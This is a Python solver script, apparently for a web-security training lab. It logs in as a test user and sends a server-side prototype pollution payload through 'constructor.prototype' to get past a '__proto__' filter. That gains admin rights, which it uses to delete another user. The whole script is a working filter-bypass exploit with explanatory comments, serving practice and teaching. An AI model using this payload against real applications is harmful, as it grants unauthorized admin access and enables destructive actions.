import sys
import os
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "../.."))
from utils.base import LabSession
from bs4 import BeautifulSoup

lab = LabSession()

# log in with a JSON body (survives clean or already-polluted state)
csrf = BeautifulSoup(lab.get("/login").text, "html.parser").find("input", {"name": "csrf"})["value"]
lab.info("Logging in as wiener...")
lab.session.post(lab.url("/login"), json={"csrf": csrf, "username": "wiener", "password": "peter"})

# the app filters out the literal "__proto__" key, so a direct pollution attempt
# leaves isAdmin false. bypass it with the constructor.prototype route: every
# object's constructor.prototype IS Object.prototype, and it never uses the
# string "__proto__", so the filter does not catch it.
address = {
    "address_line_1": "Wiener HQ",
    "address_line_2": "One Wiener Way",
    "city": "Wienerville",
    "postcode": "BU1 1RP",
    "country": "UK",
    "sessionId": lab.session.cookies.get("session"),
    "constructor": {"prototype": {"isAdmin": True}},
}

lab.info("Polluting via constructor.prototype (filter bypass)...")
resp = lab.session.post(lab.url("/my-account/change-address"), json=address)

if '"isAdmin":true' in resp.text.replace(" ", ""):
    lab.success("isAdmin reflected as true - filter bypassed, prototype polluted")
else:
    lab.warn(f"isAdmin not true, response: {resp.text}")

# with admin inherited, delete carlos via the admin panel
lab.info("Deleting carlos via the admin panel...")
lab.get("/admin/delete?username=carlos")

lab.check_solved()
